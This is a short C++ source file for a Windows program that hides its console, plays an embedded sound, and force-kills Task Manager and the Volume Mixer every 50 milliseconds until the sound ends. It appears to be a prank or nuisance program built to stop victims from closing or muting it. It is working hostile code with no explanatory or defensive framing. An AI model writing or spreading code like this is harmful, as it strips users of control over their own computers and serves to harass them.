#include <windows.h>

#include "resource.h"

#pragma comment(lib, "winmm.lib")

using namespace std;

bool exitNow = false;

int killLoop() {
    while (!exitNow)
    {
        system("taskkill -f -im Taskmgr.exe > NUL 2>&1");
        system("taskkill -f -im SndVol.exe > NUL 2>&1");
        Sleep(50);
    }
    return 1;
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)killLoop, NULL, NULL, NULL);
	
    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE);
	
    exitNow = true;
    return 0;
}
